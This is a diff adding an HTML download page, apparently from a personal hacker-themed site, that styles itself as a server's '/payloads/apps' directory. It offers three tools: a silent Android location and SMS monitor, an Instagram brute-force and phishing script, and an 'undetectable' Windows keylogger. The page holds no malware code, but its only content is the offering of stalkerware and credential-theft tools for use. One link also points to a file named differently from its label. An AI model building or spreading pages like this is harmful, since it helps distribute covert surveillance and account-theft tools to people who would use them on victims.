@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sami Ul Haq | Payloads & Apps</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        body {
+            background-color: #050505;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: repeating-linear-gradient( 0deg, rgba(0, 255, 65, 0.03) 0px, rgba(0, 255, 65, 0.03) 1px, transparent 1px, transparent 2px );
+            z-index: -1;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 20px 20px;
+            border-bottom: 2px solid #ff003c;
+            background: rgba(5, 5, 5, 0.9);
+        }
+
+        h1 { font-size: 2.5em; margin: 0; color: #ffffff; text-shadow: 0 0 10px #ff003c; letter-spacing: 2px; text-transform: uppercase; }
+        
+        .back-btn {
+            color: #888; text-decoration: none; font-size: 1em; display: inline-block; margin-top: 15px; border-bottom: 1px dashed #888;
+        }
+        .back-btn:hover { color: #00ff41; border-color: #00ff41; }
+
+        .container { max-width: 800px; margin: 40px auto; padding: 0 20px; }
+
+        .terminal-window {
+            background-color: #0a0a0a; border: 1px solid #333; box-shadow: 0 0 20px rgba(255, 0, 60, 0.2);
+        }
+
+        .terminal-header { background-color: #1a1a1a; padding: 10px; border-bottom: 1px solid #333; color: #888; font-size: 0.9em; }
+
+        .app-list { padding: 20px; }
+
+        .app-item {
+            background: #111; border-left: 4px solid #00ff41; padding: 15px; margin-bottom: 15px; transition: 0.3s; display: flex; justify-content: space-between; align-items: center;
+        }
+        .app-item:hover { background: #1a1a1a; border-left-color: #ff003c; }
+
+        .app-name { font-size: 1.2em; color: #fff; margin: 0; }
+        .app-desc { font-size: 0.9em; color: #888; margin: 5px 0 0 0; }
+
+        .download-btn {
+            background: transparent; color: #00ff41; border: 1px solid #00ff41; padding: 8px 15px; text-decoration: none; transition: 0.3s;
+        }
+        .download-btn:hover { background: #00ff41; color: #000; }
+
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+
+    <header>
+        <h1>DIRECTORY: /payloads/apps</h1>
+        <a href="index.html" class="back-btn"><< RETURN TO MAIN TERMINAL</a>
+    </header>
+
+    <div class="container">
+        <div class="terminal-window">
+            <div class="terminal-header">root@sami-server:/var/www/payloads# ls -la</div>
+            
+            <div class="app-list">
+                
+                <div class="app-item">
+                    <div>
+                        <p class="app-name">GhostCamera.apk</p>
+                        <p class="app-desc">Silent location & SMS monitor for Android.</p>
+                    </div>
+                    <a href="GhostTracker_v2.apk" class="download-btn" download>[ DOWNLOAD ]</a>
+                </div>
+
+                <div class="app-item">
+                    <div>
+                        <p class="app-name">InstaBypass_Script.zip</p>
+                        <p class="app-desc">Automated brute-force & phishing module.</p>
+                    </div>
+                    <a href="InstaBypass_Script.zip" class="download-btn" download>[ DOWNLOAD ]</a>
+                </div>
+
+                <div class="app-item">
+                    <div>
+                        <p class="app-name">Phantom_Keylogger.exe</p>
+                        <p class="app-desc">Undetectable Windows keystroke extractor.</p>
+                    </div>
+                    <a href="Phantom_Keylogger.exe" class="download-btn" download>[ DOWNLOAD ]</a>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</body>
+</html>
